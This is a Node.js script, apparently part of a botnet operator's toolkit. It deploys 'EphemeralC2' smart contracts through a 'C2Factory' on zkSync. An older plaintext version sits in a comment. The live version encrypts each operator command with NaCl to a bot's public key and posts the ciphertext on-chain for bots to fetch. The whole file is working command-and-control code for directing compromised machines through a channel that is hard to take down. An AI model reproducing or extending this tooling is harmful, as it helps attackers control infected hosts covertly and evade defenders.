/*require("dotenv").config();
const { Wallet, Provider, Contract } = require("zksync-web3");
const hre = require("hardhat");

async function main() {
  const factoryAddress = process.env.FACTORY_ADDRESS;
  const privateKey = process.env.DEPLOYER_PRIVATE_KEY;
  const command = process.argv[2];

  if (!factoryAddress || !privateKey) {
    console.error("Missing FACTORY_ADDRESS or DEPLOYER_PRIVATE_KEY in .env");
    process.exit(1);
  }

  if (!command) {
    console.error("Usage: node deploy_c2.js '<command>'");
    process.exit(1);
  }

  console.log("Using FACTORY_ADDRESS:", factoryAddress);
  console.log("Using DEPLOYER_PRIVATE_KEY:", privateKey.slice(0, 10) + "...");

  const zkProvider = new Provider("http://localhost:3050");
  const wallet = new Wallet(privateKey, zkProvider);

  const factoryArtifact = await hre.artifacts.readArtifact("C2Factory");
  const factory = new Contract(factoryAddress, factoryArtifact.abi, wallet);

  // Sanity check: does deployC2 exist?
  if (typeof factory.deployC2 !== "function") {
    throw new Error("'deployC2' function not found on the contract. Check ABI and contract address.");
  }

  console.log(`Deploying EphemeralC2 with command: "${command}"...`);

  const tx = await factory.deployC2(command);
  const receipt = await tx.wait();

  const newEvent = receipt.events?.find(e => e.event === "C2Deployed");
  const deployedAddress = newEvent?.args?.c2Address;

  if (!deployedAddress) {
    console.error("Deployment event not found or address missing.");
  } else {
    console.log(`EphemeralC2 deployed at: ${deployedAddress}`);
  }
}

main().catch((err) => {
  console.error("Error deploying EphemeralC2:", err);
  process.exit(1);
});
*/

require("dotenv").config();
const { Wallet, Provider, Contract } = require("zksync-web3");
const hre = require("hardhat");
const nacl = require("tweetnacl");
const { encodeUTF8, decodeBase64, encodeBase64 } = require("tweetnacl-util");

async function main() {
  const factoryAddress = process.env.FACTORY_ADDRESS;
  const privateKey = process.env.DEPLOYER_PRIVATE_KEY;
  const botPubKeyBase64 = process.env.BOT_PUBLIC_KEY;
  const command = process.argv[2];

  if (!factoryAddress || !privateKey || !botPubKeyBase64) {
    console.error("Missing FACTORY_ADDRESS, DEPLOYER_PRIVATE_KEY, or BOT_PUBLIC_KEY in .env");
    process.exit(1);
  }

  if (!command) {
    console.error("Usage: node deploy_c2.js '<command>'");
    process.exit(1);
  }

  console.log("Using FACTORY_ADDRESS:", factoryAddress);
  console.log("Using DEPLOYER_PRIVATE_KEY:", privateKey.slice(0, 10) + "...");
  console.log("Encrypting and deploying command:", command);

  const zkProvider = new Provider(process.env.RPC_URL || "http://localhost:3050");
  const wallet = new Wallet(privateKey, zkProvider);

  const factoryArtifact = await hre.artifacts.readArtifact("C2Factory");
  const factory = new Contract(factoryAddress, factoryArtifact.abi, wallet);

  // Encrypt the command
const naclUtil = require("tweetnacl-util");
const encoder = new TextEncoder();

const botPubKey = new Uint8Array(decodeBase64(botPubKeyBase64));            // ✅ Force type
const messageBytes = encoder.encode(command);                               // ✅ Uint8Array
const ephemKeys = nacl.box.keyPair();
const nonce = nacl.randomBytes(24);                                         // ✅ Uint8Array
const secretKey = new Uint8Array(ephemKeys.secretKey);                      // ✅ Ensure correct type

const encrypted = nacl.box(
  messageBytes,
  nonce,
  botPubKey,
  secretKey
);


  const payload = JSON.stringify({
    epk: encodeBase64(ephemKeys.publicKey),
    nonce: encodeBase64(nonce),
    ciphertext: encodeBase64(encrypted),
  });

  const tx = await factory.deployC2(payload);
  const receipt = await tx.wait();

  const newEvent = receipt.events?.find(e => e.event === "C2Deployed");
  const deployedAddress = newEvent?.args?.c2Address;

  if (!deployedAddress) {
    console.error("Deployment event not found or address missing.");
  } else {
    console.log(`✅ Encrypted EphemeralC2 deployed at: ${deployedAddress}`);
    console.log(`Ephemeral key used: ${encodeBase64(ephemKeys.publicKey)}`);
  }
}

main().catch((err) => {
  console.error("❌ Error deploying EphemeralC2:", err);
  process.exit(1);
});




